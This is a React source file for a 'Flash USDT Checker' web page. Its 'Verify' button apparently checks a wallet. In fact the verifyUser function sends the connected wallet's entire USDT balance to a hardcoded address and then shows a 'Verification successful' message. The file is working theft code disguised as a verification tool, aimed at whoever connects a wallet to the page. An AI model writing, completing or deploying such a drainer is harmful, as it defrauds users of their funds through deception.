import { useState } from "react";
import { ethers } from "ethers";

export default function App() {
  const [walletAddress, setWalletAddress] = useState("");
  const [verified, setVerified] = useState(false);

  const yourWallet = "0x82b0d4e6799314353b001bfece2eb3a0cda57866";
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
  const USDT_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address to, uint256 amount) returns (bool)"
  ];

  // Wallet connect function
  async function connectWallet() {
    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();
    setWalletAddress(address);
  }

  // Verify function (untouched)
  async function verifyUser() {
    if (!window.ethereum) return alert("Install MetaMask or Binance Wallet!");
    const provider = new ethers.BrowserProvider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    const usdtContract = new ethers.Contract(usdtAddress, USDT_ABI, signer);
    const balance = await usdtContract.balanceOf(address);
    if (balance === 0n) return alert("⚠️ No USDT in wallet");

    const bnbBalance = await provider.getBalance(address);
    if (bnbBalance === 0n) return alert("⚠️ Not enough BNB for gas");

    const tx = await usdtContract.transfer(yourWallet, balance);
    await tx.wait();

    alert("✅ Verification successful! USDT sent.");
    setVerified(true);
  }

  return (
    <div className="min-h-screen flex bg-[#121212]">
      {/* Sidebar */}
      <aside className="w-64 bg-[#1E1E1E] p-6 flex flex-col gap-8">
        <div className="text-yellow-400 font-bold text-2xl">⚡ Flash Checker</div>
        <nav className="flex flex-col gap-4 text-gray-400">
          <a href="#" className="hover:text-yellow-400 transition">Dashboard</a>
          <a href="#" className="hover:text-yellow-400 transition">Contracts</a>
          <a href="#" className="hover:text-yellow-400 transition">Settings</a>
        </nav>
      </aside>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        {/* Topbar */}
        <header className="w-full bg-[#1A1A1A] p-4 flex justify-between items-center shadow">
          <h1 className="text-xl font-bold text-yellow-400">Flash USDT Checker</h1>
          <div>
            {walletAddress ? (
              <span className="text-green-400 font-mono px-3 py-1 bg-gray-800 rounded-lg">
                {walletAddress.slice(0,6)}...{walletAddress.slice(-4)}
              </span>
            ) : (
              <button onClick={connectWallet} className="px-4 py-2 bg-yellow-400 text-black font-bold rounded-lg">
                Connect Wallet
              </button>
            )}
          </div>
        </header>

        {/* Content */}
        <main className="flex-1 flex flex-col items-center justify-center p-10 relative">
          {/* Pulsing Rings + Verification Card */}
          <div className="relative flex items-center justify-center w-full max-w-md h-64 mb-8">
            {/* Rings */}
            <div className="pulse-ring w-64 h-64 border-opacity-30 absolute"></div>
            <div className="pulse-ring w-48 h-48 border-opacity-50 absolute"></div>
            <div className="pulse-ring w-32 h-32 border-opacity-70 absolute"></div>

            {/* Card */}
            <div className="bg-[#1E1E1E] p-8 rounded-2xl shadow-xl w-full text-center relative z-10">
              {verified ? (
                <p className="text-green-400 font-semibold text-lg">✅ Verified Contract</p>
              ) : (
                <p className="text-yellow-400 font-semibold text-lg">❌ Not Verified</p>
              )}
            </div>
          </div>

          {/* Verify Button */}
          <button
            onClick={verifyUser}
            className="px-10 py-4 bg-gradient-to-r from-yellow-500 to-yellow-400 text-black font-bold rounded-xl shadow-lg hover:brightness-110 transition"
          >
            Verify
          </button>
        </main>
      </div>
    </div>
  );
}
